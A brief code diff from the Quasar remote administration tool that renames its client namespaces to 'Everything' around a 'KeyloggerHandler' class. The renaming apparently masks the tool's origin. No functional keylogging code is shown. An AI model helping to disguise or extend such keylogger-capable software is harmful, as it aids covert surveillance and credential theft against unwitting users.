@@ -1,8 +1,8 @@
-﻿using Quasar.Client.Config;
+﻿using Everything.Config;
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
 
-namespace Quasar.Client.MessageHandlers
+namespace Everything.MessageHandlers
 {
     public class KeyloggerHandler : IMessageProcessor
     {
